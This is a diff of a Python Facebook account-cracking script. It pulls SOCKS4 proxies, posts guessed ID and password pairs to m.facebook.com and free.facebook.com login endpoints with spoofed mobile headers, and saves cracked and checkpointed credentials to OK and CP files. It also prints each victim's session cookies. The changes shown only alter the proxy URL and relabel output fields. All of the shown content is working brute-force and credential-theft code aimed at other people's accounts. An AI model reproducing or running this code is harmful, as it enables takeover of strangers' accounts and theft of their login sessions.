@@ -27,7 +27,7 @@ cokbrut=[]
 ses=requests.Session()
 princp=[]
 try:
-	prox= requests.get('https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=10000&country=all').text
+	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 	open('.prox.txt','w').write(prox)
 except Exception as e:
 	print('[[\x1b[1;92m•\x1b[1;97m] [\x1b[1;96mrenvvv_renvvv')
@@ -366,8 +366,8 @@ def crack(idf,pwv):
 			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login.php?skip_api_login=1&api_key=658686778541171&kid_directed_site=0&app_id=658686778541171&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv7.0%2Fdialog%2Foauth%3Fdisplay%3Dpopup%26response_type%3Dcode%26client_id%3D658686778541171%26redirect_uri%3Dhttps%253A%252F%252Fwww.ekingsnews.com%252Fwp-login.php%253FloginSocial%253Dfacebook%26state%3Db9eb820b25d1c50ab896f860145238df%26scope%3Dpublic_profile%252Cemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd214f965-77da-4e9e-8bff-793207c95801%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.ekingsnews.com%2Fwp-login.php%3FloginSocial%3Dfacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Db9eb820b25d1c50ab896f860145238df%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
 			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				print(f'\r{x} [{K}>{N}] ID   : {K}{idf}')
-				print(f'\r{x} [{K}>{N}] PW   : {K}{pw}\n')
+				print(f'\r{x} [{K}>{N}] EMAIL/ID  : {K}{idf}')
+				print(f'\r{x} [{K}>{N}] PASSWORD  : {K}{pw}\n')
 				open('CP/'+cpc,'a').write(idf+'|'+pw)
 				#os.popen('play-audio data/cp.mp3')
 				akun.append(idf+'|'+pw)
@@ -378,8 +378,8 @@ def crack(idf,pwv):
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
 				
-				print(f'\r{x} [{H}>{N}] ID         :{H}{idf}')
-				print(f'\r{x} [{H}>{N}] PW         : {H}{pw}')
+				print(f'\r{x} [{H}>{N}] EMAIL/ID   : {H}{idf}')
+				print(f'\r{x} [{H}>{N}] PASSWORD   : {H}{pw}')
 				print(f'\r{x} [{H}>{N}] COOKIE     : {m}{kuki}{x}\n')
 				open('OK/'+okc,'a').write(idf+'|'+pw)
 				#os.popen('play-audio data/ok.mp3')
@@ -412,8 +412,8 @@ def crackfree(idf,pwv):
 			heade={'Host': 'free.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://free.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://free.facebook.com/login.php?skip_api_login=1&api_key=658686778541171&kid_directed_site=0&app_id=658686778541171&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv7.0%2Fdialog%2Foauth%3Fdisplay%3Dpopup%26response_type%3Dcode%26client_id%3D658686778541171%26redirect_uri%3Dhttps%253A%252F%252Fwww.ekingsnews.com%252Fwp-login.php%253FloginSocial%253Dfacebook%26state%3Db9eb820b25d1c50ab896f860145238df%26scope%3Dpublic_profile%252Cemail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd214f965-77da-4e9e-8bff-793207c95801%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.ekingsnews.com%2Fwp-login.php%3FloginSocial%3Dfacebook%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3Db9eb820b25d1c50ab896f860145238df%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
 			po = ses.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				print(f'\r{x} [{K}>{N}] ID   : {K}{idf}')
-				print(f'\r{x} [{K}>{N}] PW   : {K}{pw}\n')
+				print(f'\r{x} [{K}>{N}] EMAIL/ID     : {K}{idf}')
+				print(f'\r{x} [{K}>{N}] PADSWORD     : {K}{pw}\n')
 				open('CP/'+cpc,'a').write(idf+'|'+pw)
 				#os.popen('play-audio data/cp.mp3')
 				akun.append(idf+'|'+pw)
@@ -423,8 +423,8 @@ def crackfree(idf,pwv):
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r{x} [{H}>{N}] ID           :{H}{idf}')
-				print(f'\r{x} [{H}>{N}] PW           : {K}{pw}')
+				print(f'\r{x} [{H}>{N}] EMAIL/ID     : {H}{idf}')
+				print(f'\r{x} [{H}>{N}] PASSWORD     : {H}{pw}')
 				print(f'\r{x} [{H}>{N}] COOKIE       : {m}{kuki}{x}\n')
 				open('OK/'+okc,'a').write(idf+'|'+pw)
 				cek_apk(session,coki)
